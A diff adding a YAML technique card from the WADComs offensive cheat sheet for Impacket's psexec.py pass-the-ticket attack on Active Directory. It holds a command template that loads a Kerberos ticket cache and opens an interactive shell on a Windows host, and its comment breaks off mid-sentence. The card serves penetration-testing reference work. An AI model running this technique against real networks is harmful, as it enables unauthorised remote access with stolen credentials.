@@ -1,0 +1,32 @@
+id: wadcoms/impacket-psexec-passtheticket
+type: technique
+platform: active-directory
+name: Impacket PsExec PassTheTicket
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: verify upstream LICENSE
+  upstream_version: a864cd1
+  last_synced: '2026-08-25'
+preconditions:
+- tgs
+- a valid username
+commands:
+- template: export KRB5CCNAME=/full/path/to/john.ccache; python3 psexec.py test.local/john@10.10.10.1
+    -k -no-pass
+  comment: 'Impacket''s psexec.py offers psexec like functionality. This will give you an interactive
+    shell on the Windows host. psexec.py also allows using Service Tickets, saved as a ccache file for
+    Authentication. It can be obtained via Impacket''s GetST.py Command Reference: Target IP: 10.'
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py
+- https://www.sans.org/blog/psexec-python-rocks/
+- https://book.hacktricks.xyz/windows/active-directory-methodology/pass-the-ticket#pass-the-ticket-attack
+tags:
+- active-directory
+- wadcoms
+- smb
